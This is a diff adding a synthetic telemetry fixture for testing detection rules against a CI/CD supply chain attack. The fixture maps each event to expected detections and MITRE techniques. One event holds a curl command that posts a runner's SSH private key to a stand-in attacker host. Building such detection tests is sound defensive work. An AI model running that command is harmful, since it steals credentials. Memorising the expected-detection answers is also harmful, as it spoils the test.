@@ -1,0 +1,87 @@
+{
+  "test_id": "013-L3-001",
+  "package_id": "pkg-013",
+  "description": "Synthetic telemetry for CI/CD supply chain attack — Trivy-style version tag mutation, secret exfiltration from runner, tampered artifact publication",
+  "schema_version": "1.0.0",
+  "events": [
+    {
+      "event_id": "evt-001",
+      "timestamp": "2026-03-23T10:00:00Z",
+      "provider": "GitHubAuditLog",
+      "event_name": "git.push",
+      "data": {
+        "ref": "refs/tags/v0.69.3",
+        "forced": true,
+        "actor": "aqua-bot",
+        "repository": "aquasecurity/trivy",
+        "before": "abc123def456",
+        "after": "deadbeef0000"
+      },
+      "expected_detection": "KQL-001",
+      "mitre": ["T1195.002"]
+    },
+    {
+      "event_id": "evt-002",
+      "timestamp": "2026-03-23T10:02:00Z",
+      "provider": "GitHubActions",
+      "event_name": "WorkflowRun",
+      "data": {
+        "workflow": "release.yml",
+        "trigger": "tag_push",
+        "ref": "refs/tags/v0.69.3",
+        "runner_os": "Linux",
+        "runner_name": "github-runner-x64-01"
+      },
+      "expected_detection": null,
+      "mitre": ["T1059.004"]
+    },
+    {
+      "event_id": "evt-003",
+      "timestamp": "2026-03-23T10:05:00Z",
+      "provider": "MDE",
+      "event_name": "FileCreated",
+      "data": {
+        "FileName": "id_rsa",
+        "FolderPath": "/home/runner/.ssh/",
+        "ProcessName": "trivy",
+        "DeviceId": "runner-x64-01",
+        "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      },
+      "expected_detection": "KQL-001",
+      "mitre": ["T1552.001"]
+    },
+    {
+      "event_id": "evt-004",
+      "timestamp": "2026-03-23T10:06:00Z",
+      "provider": "MDE",
+      "event_name": "ProcessCreated",
+      "data": {
+        "FileName": "curl",
+        "ProcessCommandLine": "curl -X POST https://evil-c2.io/exfil -d @/home/runner/.ssh/id_rsa",
+        "ParentProcessName": "bash",
+        "DeviceId": "runner-x64-01"
+      },
+      "expected_detection": "Sigma-002",
+      "mitre": ["T1071.001", "T1552.001"]
+    },
+    {
+      "event_id": "evt-005",
+      "timestamp": "2026-03-23T10:08:00Z",
+      "provider": "ContainerRegistry",
+      "event_name": "ImagePush",
+      "data": {
+        "image": "aquasec/trivy:v0.69.3",
+        "digest": "sha256:deadbeef",
+        "pushed_by": "github-actions[bot]",
+        "size_bytes": 52428800
+      },
+      "expected_detection": "Splunk-003",
+      "mitre": ["T1195.002"]
+    }
+  ],
+  "expected_matches": [
+    {"detection_id": "KQL-001", "file": "detection.yaml", "platform": "sentinel", "description": "Correlates forced tag push + SSH key creation in runner"},
+    {"detection_id": "Sigma-002", "file": "detection.yaml", "platform": "sigma", "description": "Detects secret exfiltration via curl/wget from CI runner"},
+    {"detection_id": "Splunk-003", "file": "detection.yaml", "platform": "splunk", "description": "Detects tampered artifact push with hash mismatch"}
+  ]
+}
